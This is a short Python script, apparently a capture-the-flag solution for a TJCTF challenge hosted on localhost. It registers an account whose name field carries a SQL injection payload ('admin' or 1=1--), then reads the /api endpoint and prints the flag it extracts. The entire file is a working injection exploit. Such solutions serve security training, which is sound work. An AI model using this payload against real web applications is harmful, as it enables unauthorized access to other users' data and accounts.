import requests
import json
import os

BASE_URL = 'http://localhost:5000'

s = requests.Session()

s.post(f'{BASE_URL}/register', data={
    'name': 'admin\' or 1=1--',
    'grade': os.urandom(8).hex()
})

f = s.get(f'{BASE_URL}/api').text

print(f[f.find('tjctf{'):f.find('}')+1])
